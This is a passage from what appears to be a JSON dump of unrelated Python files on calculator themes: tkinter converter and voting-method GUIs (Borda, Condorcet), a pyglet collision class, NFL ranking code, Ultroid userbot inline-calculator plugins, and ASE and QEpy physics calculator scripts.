 has_error = \"yes\"\n\n        if has_error == \"yes\":\n            # Display error message\n            self.save_error_label.config(text=f\"Invalid filename - \"\n                                              f\"{error_type}\")\n            # Change entry box background to orange\n            self.filename_entry.config(bg=\"#ebc091\")\n            print()\n        else:\n            # If there are no errors, generate text and file and then close\n            # dialogue, Add .txt suffix\n            filename = filename + \".txt\"\n\n            # Create file to hole data\n            f = open(filename, \"w+\")\n\n            for item in calc_history:\n                f.write(item + \"\\n\")\n\n            # close file\n            f.close()\n\n            # Close dialogue\n            self.close_export(partner)\n\n    def close_export(self, partner):\n        # Put export button back to normal...\n        partner.export_button.config(state=NORMAL)\n        self.export_box.destroy()\n\n\n# main routine\nif __name__ == \"__main__\":\n    root = Tk()\n    root.title(\"Temperature Converter\")\n    something = Converter()\n    root.mainloop()\n", "197": "import pyglet\r\nfrom hitbox import hitbox\r\n\r\nclass walls:\r\n    def __init__(self, wallsArr):\r\n        self.wallCtr = 0\r\n        self.wallsArr = wallsArr\r\n        self.spriteArr = []\r\n        self.wallHitboxArr = []\r\n\r\n        self.wallThicc = 1\r\n\r\n        self.labelBatch = pyglet.graphics.Batch()\r\n        self.inRange = False\r\n\r\n        self.dotBatch = pyglet.graphics.Batch()\r\n\r\n        image = pyglet.image.load('Res/sprites/dot.png')\r\n        self.dot1 = pyglet.sprite.Sprite(image, x=0, y = 0, batch = self.dotBatch)\r\n        self.dot2 = pyglet.sprite.Sprite(image, x=0, y = 0, batch = self.dotBatch)\r\n        self.dot3 = pyglet.sprite.Sprite(image, x=0, y = 0, batch = self.dotBatch)\r\n        self.dot4 = pyglet.sprite.Sprite(image, x=0, y = 0, batch = self.dotBatch)\r\n\r\n        self.collisionDot = pyglet.sprite.Sprite(image, x=0, y =0, batch = self.dotBatch)\r\n\r\n        self.wallBatch = pyglet.graphics.Batch()\r\n\r\n        for wall in wallsArr:\r\n            \r\n            print(\"wall \" + str(self.wallCtr))\r\n            image = \"wall\" + str(self.wallCtr) + \".png\"\r\n            image = pyglet.image.load('Res/sprites/' + image)\r\n            sprite = pyglet.sprite.Sprite(image, x=0, y = 0, batch = self.wallBatch)\r\n            self.spriteArr.append(sprite)\r\n            self.calcWallHitbox(wall)\r\n\r\n            self.wallCtr += 1\r\n\r\n        for wallHitbox in self.wallHitboxArr:\r\n            wallHitbox.updateEdges()\r\n            print(wallHitbox.leftMostx)\r\n            print(wallHitbox.rightMostx)\r\n            print(wallHitbox.topMosty)\r\n            print(wallHitbox.botMosty)\r\n            \r\n\r\n    def draw(self):\r\n        self.wallBatch.draw()\r\n        self.dotBatch.draw()\r\n        self.labelBatch.draw()\r\n\r\n    def checkCollision(self, hitboxAdd):\r\n        ctr = 0\r\n        for wall in self.wallHitboxArr:\r\n            if wall.checkCollision(hitboxAdd):\r\n                return True\r\n            else:\r\n                ctr += 1\r\n                if ctr == self.wallCtr:\r\n                    return False\r\n                \r\n\r\n    def calcWallHitbox(self, wall):\r\n        thiccness = int(self.wallThicc / 2)\r\n        if wall[0][0] <= wall[1][0]:\r\n            print(\"1\")\r\n            leftMostx = wall[0][0]\r\n            rightMostx = wall[1][0]\r\n        else:\r\n            print(\"2\")\r\n            leftMostx = wall[1][0]\r\n            rightMostx = wall[0][0]\r\n        if wall[0][1] >= wall[1][1]:\r\n            print(\"3\")\r\n            topMosty = wall[1][1]\r\n            botMosty = wall[0][1]\r\n        else:\r\n            print(\"4\")\r\n            topMosty = wall[0][1]\r\n            botMosty = wall[1][1]\r\n\r\n        thiccCalc = ((topMosty - botMosty) / (rightMostx - leftMostx)) * thiccness\r\n        inverseThiccCalc = (-1 * (rightMostx - leftMostx) / (topMosty - botMosty)) * thiccness\r\n\r\n        cord1x = 0\r\n        cord1y = 0\r\n        cord2x = 0\r\n        cord2y = 0\r\n        cord3x = 0\r\n        cord3y = 0\r\n        cord4x = 0\r\n        cord4y = 0\r\n\r\n        if wall[0][0] <= wall[1][0]:\r\n            if wall[0][1] >= wall[1][1]:\r\n                print(\"meme\")\r\n                cord1x = wall[0][0] + thiccCalc\r\n                cord1y = wall[0][1] + inverseThiccCalc\r\n                cord2x = wall[0][0] - thiccCalc\r\n                cord2y = wall[0][1] - inverseThiccCalc\r\n                cord3x = wall[1][0] + thiccCalc\r\n                cord3y = wall[1][1] + inverseThiccCalc\r\n                cord4x = wall[1][0] - thiccCalc\r\n                cord4y = wall[1][1] - inverseThiccCalc\r\n            else:\r\n                print(\"meme2\")\r\n                cord1x = wall[1][0] + thiccCalc\r\n                cord1y = wall[1][1] + inverseThiccCalc\r\n                cord2x = wall[1][0] - thiccCalc\r\n                cord2y = wall[1][1] - inverseThiccCalc\r\n                cord3x = wall[0][0] + thiccCalc\r\n                cord3y = wall[0][1] + inverseThiccCalc\r\n                cord4x = wall[0][0] - thiccCalc\r\n                cord4y = wall[0][1] - inverseThiccCalc\r\n        else:\r\n            if wall[0][1] >= wall[1][1]:\r\n                print(\"meme3\")\r\n                cord1x = wall[0][0] + thiccCalc\r\n                cord1y = wall[0][1] + inverseThiccCalc\r\n                cord2x = wall[0][0] - thiccCalc\r\n                cord2y = wall[0][1] - inverseThiccCalc\r\n                cord3x = wall[1][0] + thiccCalc\r\n                cord3y = wall[1][1] + inverseThiccCalc\r\n                cord4x = wall[1][0] - thiccCalc\r\n                cord4y = wall[1][1] - inverseThiccCalc\r\n            else:\r\n                print(\"meme4\")\r\n                cord1x = wall[1][0] + thiccCalc\r\n                cord1y = wall[1][1] + inverseThiccCalc\r\n                cord2x = wall[1][0] - thiccCalc\r\n                cord2y = wall[1][1] - inverseThiccCalc\r\n                cord3x = wall[0][0] + thiccCalc\r\n                cord3y = wall[0][1] + inverseThiccCalc\r\n                cord4x = wall[0][0] - thiccCalc\r\n                cord4y = wall[0][1] - inverseThiccCalc\r\n\r\n        self.dot1.x = cord1x\r\n        self.dot1.y = cord1y\r\n        self.dot2.x = cord2x\r\n        self.dot2.y = cord2y\r\n        self.dot3.x = cord3x\r\n        self.dot3.y = cord3y\r\n        self.dot4.x = cord4x\r\n        self.dot4.y = cord4y\r\n\r\n        print(str(cord1x) + \" \" + str(cord1y) + \" \" +str(cord2x) + \" \" + str(cord2y) + \" \" + str(cord3x) + \" \" +str(cord3y) + \" \" + str(cord4x) + \" \" + str(cord4y))\r\n\r\n        wallhitbox = hitbox(cord1x, cord1y, cord2x, cord2y, cord3x, cord3y, cord4x, cord4y)\r\n        self.wallHitboxArr.append(wallhitbox)\r\n", "198": "from __future__ import division\nimport sys\nimport init\nimport calculations\nimport output\n\ndef calc_rankings(input_year, input_week):\n    teams = init.init_teams(input_year, input_week);\n    teams = calculations.init_calc_team_record_ranking(teams)\n\n    teams = calculations.calc_value_ranking(teams, 'points_scored_avg', 'points_scored_ranking', True)\n    teams = calculations.calc_value_ranking(teams, 'points_against_avg', 'points_against_ranking', False)\n    teams = calculations.calc_value_ranking(teams, 'turnover_differential', 'turnover_differential_ranking', True)\n    teams = calculations.calc_value_transformation(teams, 'points_scored_avg', 'points_scored_transformation', True)\n    teams = calculations.calc_value_transformation(teams, 'points_against_avg', 'points_against_transformation', False)\n    teams = calculations.calc_value_transformation(teams, 'turnover_differential', 'turnover_differential_transformation', True)\n\n    teams = calculations.calc_advanced_stats(teams)\n\n    teams = calculations.calc_value_transformation(teams, 'pythagorean_wins', 'pythagorean_wins_transformation', True)\n    teams = calculations.calc_value_transformation(teams, 'victory_value', 'victory_value_transformation', True)\n    teams = calculations.calc_value_transformation(teams, 'point_differential_strength', 'point_differential_transformation', True)\n    teams = calculations.calc_value_transformation(teams, 'win_percentage', 'win_percentage_transformation', True)\n\n    teams = calculations.init_calc_power_ranking(teams)\n\n    output.print_power_rankings(teams)\n    output.export_to_json(teams, input_week, input_year)\n\ndef calc_multiple_weeks(beg_year, beg_week, end_year, end_week):\n    first_archived_year = 2009\n    weeks_in_a_season = 17\n\n    year_iterations = (end_year - beg_year) + 1\n\n    if year_iterations == 1:\n        beg_year_week_iterations = (end_week - beg_week) + 1\n        final_year_week_iterations = (end_week - beg_week) + 1\n    else:\n        beg_year_week_iterations = (weeks_in_a_season - beg_week) + 1\n        final_year_week_iterations = end_week\n\n    for year_index in range(year_iterations):\n        year = beg_year + year_index\n\n        if year == beg_year:\n            week_iterations = beg_year_week_iterations\n            initial_week = beg_week\n        elif year == end_year:\n            week_iterations = final_year_week_iterations\n            initial_week = 1\n        else:\n            week_iterations = weeks_in_a_season\n            initial_week = 1\n\n        for week_index in range(week_iterations):\n            week = initial_week + week_index\n\n            calc_rankings(year, week)\n\n\ndef entry(year=None, week=None, calc_type=None):\n    calc_type = calc_type or sys.argv[1]\n\n    if calc_type == 'multiple':\n        beg_year = year[0] if year else int(sys.argv[2])\n        beg_week = week[0] if week else int(sys.argv[3])\n        end_year = year[-1] if year else int(sys.argv[4])\n        end_week = week[-1] if week else int(sys.argv[5])\n\n        calc_multiple_weeks(beg_year, beg_week, end_year, end_week)\n    elif calc_type == 'single':\n        input_year = year or int(sys.argv[2])\n        input_week = week or int(sys.argv[3])\n\n        calc_rankings(input_year, input_week)\n\n\nif __name__ == '__main__':\n    year = 2018\n    week = 1\n    calc_type = 'single'\n\n    entry(year=year, week=week, calc_type=calc_type)\n    print('debug')\nelse:\n    entry()", "199": "# Ultroid - UserBot\n# Copyright (C) 2020 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\n\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await ultroid_bot.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n\n\nHELP.update({f\"{__name__.split('.')[1]}\": f\"{__doc__.format(i=HNDLR)}\"})\n", "200": "import pytest\nimport numpy as np\nfrom ase.build import bulk, molecule\nfrom ase.units import Hartree\n\n\ncalc = pytest.mark.calculator\n\nrequired_quantities = {'eigenvalues',\n                       'fermilevel',\n                       'version',\n                       'forces',\n                       'energy',\n                       'free_energy',\n                       'stress',\n                       'ibz_kpoints',\n                       'kpoint_weights'}\n\n\ndef run(atoms):\n    atoms.get_forces()\n    print(sorted(atoms.calc.results))\n    for key, value in atoms.calc.results.items():\n        if isinstance(value, np.ndarray):\n            print(key, value.shape, value.dtype)\n        else:\n            print(key, value)\n\n    for name in required_quantities:\n        assert name in atoms.calc.results\n\n    return atoms.calc.results\n\n\n@pytest.mark.calculator_lite\n@calc('abinit')\n@calc('abinit', v8_legacy_format=False)\ndef test_si(factory):\n    atoms = bulk('Si')\n    atoms.calc = factory.calc(nbands=4 * len(atoms), kpts=[4, 4, 4])\n    run(atoms)\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.parametrize('pps', ['fhi', 'paw'])\n@calc('abinit')\ndef test_au(factory, pps):\n    atoms = bulk('Au')\n    atoms.calc = factory.calc(\n        pps=pps,\n        nbands=10 * len(atoms),\n        tsmear=0.1,\n        occopt=3,\n        kpts=[2, 2, 2],\n        pawecutdg=6.0 * Hartree,\n    )\n    # Somewhat awkward to set pawecutdg also when we are not doing paw,\n    # but it's an error to pass None as pawecutdg.\n    run(atoms)\n\n\n@pytest.fixture\ndef fe_atoms(abinit_factory):\n    atoms = bulk('Fe')\n    atoms.set_initial_magnetic_moments([1])\n    calc = abinit_factory.calc(nbands=8,\n                               kpts=[2, 2, 2])\n    atoms.calc = calc\n    return atoms\n\n\ndef test_fe_fixed_magmom(fe_atoms):\n    fe_atoms.calc.set(spinmagntarget=2.3)\n    run(fe_atoms)\n\n\n@pytest.mark.calculator_lite\ndef test_fe_any_magmom(fe_atoms):\n    fe_atoms.calc.set(occopt=7)\n    run(fe_atoms)\n\n\n@calc('abinit')\ndef test_h2o(factory):\n    atoms = molecule('H2O', vacuum=2.5)\n    atoms.calc = factory.calc(nbands=8)\n    run(atoms)\n\n\n@calc('abinit')\ndef test_o2(factory):\n    atoms = molecule('O2', vacuum=2.5)\n    atoms.calc = factory.calc(nbands=8, occopt=7)\n    run(atoms)\n    magmom = atoms.get_magnetic_moment()\n    assert magmom == pytest.approx(2, 1e-2)\n    print('magmom', magmom)\n\n\n@pytest.mark.skip('expensive')\n@calc('abinit')\ndef test_manykpts(factory):\n    atoms = bulk('Au') * (2, 2, 2)\n    atoms.rattle(stdev=0.01)\n    atoms.symbols[:2] = 'Cu'\n    atoms.calc = factory.calc(nbands=len(atoms) * 7, kpts=[8, 8, 8])\n    run(atoms, 'manykpts')\n\n\n@pytest.mark.skip('expensive')\n@calc('abinit')\ndef test_manyatoms(factory):\n    atoms = bulk('Ne', cubic=True) * (4, 2, 2)\n    atoms.rattle(stdev=0.01)\n    atoms.calc = factory.calc(nbands=len(atoms) * 5)\n    run(atoms, 'manyatoms')\n", "201": "import tkinter as tk\r\nfrom itertools import permutations\r\n\r\ndef make_button(method):\r\n    return tk.Button(text=method, bd=5, font=('Arial', 17), bg='yellow', command=lambda : choose(method))\r\n\r\ndef choose(method):\r\n    if method == \"\u041c\u0435\u0442\u043e\u0434 \u0411\u043e\u0440\u0434\u0430\":\r\n        frame_Borda(method)\r\n    else:\r\n        frame_Condorce(method)\r\n    \r\ndef make_label_main(label):\r\n    return tk.Label(text=label, bd=5, font=('Arial', 17), borderwidth=3, relief=\"solid\")\r\n\r\ndef make_label_other(label, fr):\r\n    return tk.Label(fr, text=label, bd=5, font=('Arial', 15), borderwidth=3, relief=\"solid\")\r\n\r\ndef frame_Borda(method):\r\n    A = method_Borda(input_matrix, 'A')\r\n    B = method_Borda(input_matrix, 'B')\r\n    C = method_Borda(input_matrix, 'C')\r\n    \r\n    window_calc = tk.Tk()\r\n    window_calc.geometry(\"380x500\")\r\n    window_calc.resizable(0,0)\r\n    window_calc.title(method)\r\n    \r\n    A_B_C = [\"A\", \"B\", \"C\"]\r\n    res_A_B_C = [A, B, C]\r\n    \r\n    for i in range(0, len(A_B_C)):\r\n        make_label_other(i+1, window_calc).grid(row=i+1, column=1, stick='wens', padx=3, pady=3)\r\n        make_label_other(A_B_C[i], window_calc).grid(row=i+1, column=2, stick='wens', padx=3, pady=3)\r\n        make_label_other(res_A_B_C[i], window_calc).grid(row=i+1, column=3, stick='wens', padx=3, pady=3)\r\n    \r\n    best = max(res_A_B_C)\r\n    res_str = \"\u041f\u0435\u0440\u0435\u043c\u043e\u0436\u0446\u0435\u043c \u0437\u0430 \u043c\u0435\u0442\u043e\u0434\u043e\u043c\\n \u0411\u043e\u0440\u0434\u0430 \u0454 \u043a\u0430\u043d\u0434\u0438\u0434\u0430\u0442 \" + A_B_C[res_A_B_C.index(best)] + \"\\n\u0437 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u043c \" + str(best)\r\n    res = make_label_other(res_str, window_calc)\r\n    res.grid(row=4, rowspan=5, column=1, columnspan=3, stick='wens', padx=3, pady=3)\r\n    \r\n    window_calc.grid_columnconfigure(0, minsize = 70)\r\n    window_calc.grid_columnconfigure(1, minsize = 70)\r\n    window_calc.grid_columnconfigure(2, minsize = 70)\r\n    window_calc.grid_columnconfigure(3, minsize = 70)\r\n    window_calc.grid_columnconfigure(4, minsize = 70)\r\n    \r\n    window_calc.grid_rowconfigure(0, minsize = 70)\r\n    window_calc.grid_rowconfigure(1, minsize = 70)\r\n    window_calc.grid_rowconfigure(2, minsize = 70)\r\n    window_calc.grid_rowconfigure(3, minsize = 70)\r\n    window_calc.grid_rowconfigure(4, minsize = 70)\r\n    window_calc.grid_rowconfigure(5, minsize = 70)\r\n    \r\n    window_calc.mainloop()\r\n\r\ndef method_Borda(mat, candidate):\r\n    Sum = 0\r\n    for i in range(0, len(mat)):    \r\n        for j in range(1, len(mat[i])):\r\n            if mat[i][j] == candidate:\r\n                if mat[i].index(candidate) == 1:\r\n                    Sum += mat[i][0] * 2\r\n                elif mat[i].index(candidate) == 2:\r\n                    Sum += mat[i][0] * 1\r\n                elif mat[i].index(candidate) == 3:\r\n                    Sum += mat[i][0] * 0\r\n    return Sum\r\n\r\ndef frame_Condorce(method):\r\n    str_A_B, sum_A_B = method_Condorce(input_matrix, 'A', 'B')\r\n    str_B_C, sum_B_C = method_Condorce(input_matrix, 'B', 'C')\r\n    str_A_C, sum_A_C = method_Condorce(input_matrix, 'A', 'C')\r\n    \r\n    all_str = str_A_B + str_B_C + str_A_C\r\n    all_digit = sum_A_B + sum_B_C + sum_A_C\r\n    \r\n    window_calc = tk.Tk()\r\n    window_calc.geometry(\"340x500\")\r\n    window_calc.resizable(0,0)\r\n    window_calc.title(method)\r\n    \r\n    for i in range(0, len(all_str)):\r\n        make_label_other(all_str[i], window_calc).grid(row=i+1, column=1, stick='wens', padx=3, pady=3)\r\n        make_label_other(all_digit[i], window_calc).grid(row=i+1, column=2, stick='wens', padx=3, pady=3)\r\n    \r\n    A_B = make_label_other(str_A_B[sum_A_B.index(max(sum_A_B))], window_calc)\r\n    A_B.grid(row=1, rowspan=2, column=3, stick='wens', padx=3, pady=3)\r\n    B_C = make_label_other(str_B_C[sum_B_C.index(max(sum_B_C))], window_calc)\r\n    B_C.grid(row=3, rowspan=2, column=3, stick='wens', padx=3, pady=3)\r\n    A_C = make_label_other(str_A_C[sum_A_C.index(max(sum_A_C))], window_calc)\r\n    A_C.grid(row=5, rowspan=2, column=3, stick='wens', padx=3, pady=3)\r\n    \r\n    all_str_2d = [str_A_B[sum_A_B.index(max(sum_A_B))],\r\n                  str_B_C[sum_B_C.index(max(sum_B_C))],\r\n                  str_A_C[sum_A_C.index(max(sum_A_C))]]\r\n    all_str_2d = list(permutations(all_str_2d))\r\n    \r\n    for i in range(0, len(all_str_2d)):\r\n        determine_result(all_str_2d[i][0], all_str_2d[i][1], all_str_2d[i][2], window_calc)\r\n    \r\n    window_calc.grid_columnconfigure(0, minsize = 50)\r\n    window_calc.grid_columnconfigure(1, minsize = 50)\r\n    window_calc.grid_columnconfigure(2, minsize = 50)\r\n    window_calc.grid_columnconfigure(3, minsize = 50)\r\n    window_calc.grid_columnconfigure(4, minsize = 50)\r\n    \r\n    window_calc.grid_rowconfigure(0, minsize = 50)\r\n    window_calc.grid_rowconfigure(1, minsize = 50)\r\n    window_calc.grid_rowconfigure(2, minsize = 50)\r\n    window_calc.grid_rowconfigure(3, minsize = 50)\r\n    window_calc.grid_rowconfigure(4, minsize = 50)\r\n    window_calc.grid_rowconfigure(5, minsize = 50)\r\n    window_calc.grid_rowconfigure(6, minsize = 50)\r\n    window_calc.grid_rowconfigure(7, minsize = 50)\r\n    window_calc.grid_rowconfigure(8, minsize = 50)\r\n    \r\n    window_calc.mainloop()\r\n\r\ndef method_Condorce(mat, candidate1, candidate2):\r\n    res1 = 0\r\n    res2 = 0\r\n    for i in range(0, len(mat)):\r\n        if mat[i].index(candidate1) < mat[i].index(candidate2):\r\n            res1 += mat[i][0]\r\n        else:\r\n            res2 += mat[i][0]\r\n    res = [res1, res2]\r\n    compare = [candidate1 + \" > \" + candidate2, candidate2 + \" > \" + candidate1]\r\n    return compare, res\r\n\r\ndef determine_result(str1, str2, str3, fr):\r\n    if str1[len(str1) - 1] == str2[0]:\r\n        str1_str2 = str1 + ' > ' + str2[len(str2) - 1]\r\n        if str1_str2[0] == str3[0] and str1_str2[len(str1_str2) - 1] == str3[len(str3) - 1]:\r\n            make_label_other(str1_str2, fr).grid(row=7, column=1, columnspan=3, stick='wens', padx=3, pady=3)\r\n            make_label_other('\u041f\u0435\u0440\u0435\u043c\u043e\u0436\u0446\u0435\u043c \u0437\u0430 \u043c\u0435\u0442\u043e\u0434\u043e\u043c\\n\u041a\u043e\u043d\u0434\u043e\u0440\u0441\u0435 \u0454 \u043a\u0430\u043d\u0434\u0438\u0434\u0430\u0442 '+ str1_str2[0], fr).grid(row=8, column=1, columnspan=3, stick='wens', padx=3, pady=3)\r\n        else:\r\n            make_label_other('\u0420\u0430\u0437\u043e\u043c \u0446\u0456 \u0442\u0432\u0435\u0440\u0434\u0436\u0435\u043d\u043d\u044f \u0441\u0443\u043f\u0435\u0440\u0435\u0447\u043b\u0438\u0432\u0456.\\n\u041d\u0435\u043c\u043e\u0436\u043b\u0438\u0432\u043e \u043f\u0440\u0438\u0439\u043d\u044f\u0442\u0438 \u044f\u043a\u0435\u0441\u044c\\n\u0443\u0437\u0433\u043e\u0434\u0436\u0435\u043d\u0435 \u0440\u0456\u0448\u0435\u043d\u043d\u044f', fr).grid(row=7, rowspan=9, column=1, columnspan=3, stick='wens', padx=3, pady=3)\r\n\r\nfile = open('lab 3.txt', 'r')\r\n\r\ninput_matrix = []\r\nfor line in file:\r\n        strip = line.strip()\r\n        split = strip.split(' ')\r\n        for i in range(0, len(split)):\r\n            if split[i].isdigit():\r\n                split[i] = int(split[i])\r\n        input_matrix.append(split)\r\nfile.close()\r\n\r\nwindow = tk.Tk()\r\nwindow.geometry(\"300x550\")\r\nwindow.resizable(0,0)\r\nwindow.title('\u041c\u0435\u0442\u043e\u0434\u0438 \u043a\u043e\u043b\u0435\u043a\u0442\u0438\u0432\u043d\u0438\u0445 \u0440\u0456\u0448\u0435\u043d\u044c')\r\n\r\nfor i in range(2, 5):\r\n    make_label_main(i-1).grid(row=1, column=i, stick='wens', padx=3, pady=3)\r\n\r\nfor i in range(2, len(input_matrix)+2):\r\n    for j in range(2, len(input_matrix[i-3])+2):\r\n        make_label_main(input_matrix[i-2][j-2]).grid(row=i, column=j-1, stick='wens', padx=3, pady=3)\r\n    \r\nmake_button(\"\u041c\u0435\u0442\u043e\u0434 \u0411\u043e\u0440\u0434\u0430\").grid(row=len(input_matrix)+2, column=1, columnspan=4, stick='wens', padx=3, pady=3)\r\nmake_button(\"\u041c\u0435\u0442\u043e\u0434 \u041a\u043e\u043d\u0434\u043e\u0440\u0441\u0435\").grid(row=len(input_matrix)+3, column=1, columnspan=4, stick='wens', padx=3, pady=3)\r\n\r\nwindow.grid_columnconfigure(0, minsize = 50)\r\nwindow.grid_columnconfigure(1, minsize = 50)\r\nwindow.grid_columnconfigure(2, minsize = 50)\r\nwindow.grid_columnconfigure(3, minsize = 50)\r\nwindow.grid_columnconfigure(4, minsize = 50)\r\nwindow.grid_columnconfigure(5, minsize = 50)\r\n\r\nwindow.grid_rowconfigure(0, minsize = 50)\r\nwindow.grid_rowconfigure(1, minsize = 50)\r\nwindow.grid_rowconfigure(2, minsize = 50)\r\nwindow.grid_rowconfigure(3, minsize = 50)\r\nwindow.grid_rowconfigure(4, minsize = 50)\r\nwindow.grid_rowconfigure(5, minsize = 50)\r\nwindow.grid_rowconfigure(6, minsize = 50)\r\nwindow.grid_rowconfigure(7, minsize = 50)\r\nwindow.grid_rowconfigure(8, minsize = 50)\r\n\r\nwindow.mainloop()", "202": "#!/usr/bin/env python3\nimport qepy\nimport time\n\ntry:\n    from mpi4py import MPI\n    comm = MPI.COMM_WORLD\nexcept Exception:\n    comm = None\n\nfrom qepy.calculator import QEpyCalculator\n\ninputfile = 'qe_in.in'\n\ncalc = QEpyCalculator(comm = comm, inputfile = inputfile)\n\nget_potential_energy      = calc.get_potential_energy()\nget_forces                = calc.get_forces()\nget_stress                = calc.get_stress()\nget_density               = calc.get_density()\nget_bz_k_points           = calc.get_bz_k_points()\nget_effective_potential   = calc.get_effective_potential()\nget_eigenvalues           = calc.get_eigenvalues()\nget_fermi_level           = calc.get_fermi_level()\nget_ibz_k_points          = calc.get_ibz_k_points()\nget_k_point_weights       = calc.get_k_point_weights()\nget_magnetic_moment       = calc.get_magnetic_moment()\nget_number_of_bands       = calc.get_number_of_bands()\nget_number_of_grid_points = calc.get_number_of_grid_points()\nget_number_of_spins       = calc.get_number_of_spins()\nget_occupation_numbers    = calc.get_occupation_numbers()\nget_pseudo_density        = calc.get_pseudo_density()\nget_pseudo_wave_function  = calc.get_pseudo_wave_function()\nget_spin_polarized        = calc.get_spin_polarized()\nget_xc_functional         = calc.get_xc_functional()\n\ntime.sleep(0.1)\n\nif calc.rank == 0 :\n    print('ncharge:', get_density.sum()*calc.atoms.get_volume()/get_density.shape[0] , flush = True)\n    print(\"calc.get_potential_energy()           =\" , get_potential_energy           , flush = True)\n    print(\"calc.get_forces()[0]                  =\" , get_forces[0]                  , flush = True)\n    print(\"calc.get_stress()[0]                  =\" , get_stress[0]                  , flush = True)\n    print(\"calc.get_density()[0]                 =\" , get_density[0]                 , flush = True)\n    print(\"calc.get_bz_k_points()[:, 0]          =\" , get_bz_k_points[:, 0]          , flush = True)\n    print(\"calc.get_effective_potential()[0]     =\" , get_effective_potential[0]     , flush = True)\n    print(\"calc.get_eigenvalues()[0]             =\" , get_eigenvalues[0]             , flush = True)\n    print(\"calc.get_fermi_level()                =\" , get_fermi_level                , flush = True)\n    print(\"calc.get_ibz_k_points()[:, 0]         =\" , get_ibz_k_points[:, 0]         , flush = True)\n    print(\"calc.get_k_point_weights()[0]         =\" , get_k_point_weights[0]         , flush = True)\n    print(\"calc.get_magnetic_moment()            =\" , get_magnetic_moment            , flush = True)\n    print(\"calc.get_number_of_bands()            =\" , get_number_of_bands            , flush = True)\n    print(\"calc.get_number_of_grid_points()      =\" , get_number_of_grid_points      , flush = True)\n    print(\"calc.get_number_of_spins()            =\" , get_number_of_spins            , flush = True)\n    print(\"calc.get_occupation_numbers()[0]      =\" , get_occupation_numbers[0]      , flush = True)\n    print(\"calc.get_pseudo_density()[0]          =\" , get_pseudo_density[0]          , flush = True)\n    print(\"calc.get_pseudo_wave_function()[0, 0] =\" , get_pseudo_wave_function[0, 0] , flush = True)\n    print(\"calc.get_spin_polarized()             =\" , get_spin_polarized             , flush = True)\n    print(\"calc.get_xc_functional()              =\" , get_xc_functional              , flush = True)\n\ntime.sleep(0.1)\nprint('ncharge - > rank {} : {}'.format(calc.rank, get_pseudo_density.sum()*calc.atoms.get_volume()/get_number_of_grid_points.prod()), flush=True)\n", "203": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    